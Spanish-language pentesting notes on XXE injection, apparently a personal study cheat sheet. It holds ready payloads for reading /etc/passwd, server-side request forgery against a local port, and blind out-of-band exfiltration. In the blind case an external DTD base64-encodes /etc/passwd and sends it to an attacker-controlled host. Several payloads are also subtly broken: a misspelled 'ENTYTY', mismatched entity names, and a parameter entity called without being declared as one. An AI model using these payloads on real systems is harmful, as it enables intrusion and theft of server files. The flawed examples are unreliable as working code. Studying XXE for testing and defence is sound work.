-------
- tags: #xml #web #lfi #SSRF #burpsuite 
------------
# ¿Qué es?
> Hace referencia a XML (eXtensible Markup Language) eXternal Entity Injection y nos permite llegar a ver archivos del equipo a través de etiquetas XML que podemos modificar
W
## Ejemplo de XML normal
```xml
<? xml version="1.0" encoding="UTF-8"?>
<root>
	<name>
		David
	</name>
	<surname>
		Alonso
	</surname>
	<birth>
		05/05/2004
	</birth>
</root>
```

## Ejemplo de Explotación XML

Podemos llegar a representar la misma información que en el ejemplo anterior si hacemos lo siguiente:

```xml
<? xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY myName "David">]>
<root>
	<name>
		&myName;
	</name>
	<surname>
		Alonso
	</surname>
	<birth>
		05/05/2004
	</birth>
</root>```

De este modo, estamos declarando la ENTIDAD "myName" cuyo valor es "David" y llamando más tarde al valor de la entidad con "&myName;"


## XXE ---> LFI

Podemos referenciar a archivos de la siguiente manera:

```xml
<? xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
<root>
	<name>
		&myFile;
	</name>
	<surname>
		Alonso
	</surname>
	<birth>
		05/05/2004
	</birth>
</root>```


De este modo, conseguimos crear la entidad myFile cuyo valor será en contenido del fichero "/etc/passwd" y representarlo a través de "&myFile;"

## XXE ---> SSRF

```xml
<? xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]>
<root>
	<name>
		&myName;
	</name>
	<surname>
		Alonso
	</surname>
	<birth>
		05/05/2004
	</birth>
</root>```

## XXE ---> RCE

Hay formas de derivar XXE a RCE a través de wrappers de php, [haz clic para saber más](https://airman604.medium.com/from-xxe-to-rce-with-php-expect-the-missing-link-a18c265ea4c7)



## XXE OOB (Out Of Bound) (Blind)

> Si al explotar la inyección XXE no vemos output, o no podemos mostrar entidades, podremos aun así llegar a explotarlo a través de un XXE OOB.

Declaramos la siguiente estructura XML:
```xml
<? xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://miip/malicious.dtd"> %xxe;]>
<root>
	<name>
		&myFile;
	</name>
	<surname>
		Alonso
	</surname>
	<birth>
		05/05/2004
	</birth>
</root>```

Teniendo un servidor http montado con el fichero malicious.dtd que contenga lo siguiente:

malicious.dtd:
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTYTY &#x25; exfil SYSTEM 'http://miip/?file=%file;'>">
%eval;
%exfil;
```
**(Aclaración: &#x25; es como se representa el % cuando la entidad se encuentra dentro de otra entidad, el % es 25 en hexadecimal)**


Deberíamos de recibir una solicitud que contendrá el archivo /etc/passwd en base64

